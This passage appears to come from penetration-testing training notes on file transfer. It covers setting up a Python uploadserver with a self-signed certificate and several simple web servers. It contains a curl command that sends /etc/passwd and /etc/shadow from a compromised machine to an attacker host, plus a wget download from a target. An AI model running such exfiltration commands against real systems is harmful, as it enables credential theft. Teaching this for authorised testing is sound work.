-----
For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.

- Start Web Server on attack host
```bash
sudo python3 -m pip install --user uploadserver
```

We need to create a certificate, we are using a self-signed certificate.

- Create a self-signed certificate
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

- Start web server
```bash
mkdir https && cd https
```

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Now from the compromised machine, we can upload files.

```bash
curl -X POST https://<attack-host-ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.


#### Alternative Web File Transfer Methods
---
##### Linux - Creating a Web Server with Python3
```bash
python3 -m http.server
```

##### Linux - Creating a Web Server with Python2.7
```bash
python2.7 -m SimpleHTTPServer
```

##### Linux - Creating a Web Server with PHP
```bash
php -S 0.0.0.0:8000
```

##### Linux - Creating a Web Server with Ruby
```bash
ruby -run -ehttpd . -p8000
```

##### Download the File from the Target Machine onto the Pwnbox
```bash
wget <target-machine-ip>:8000/filetotransfer.txt
```

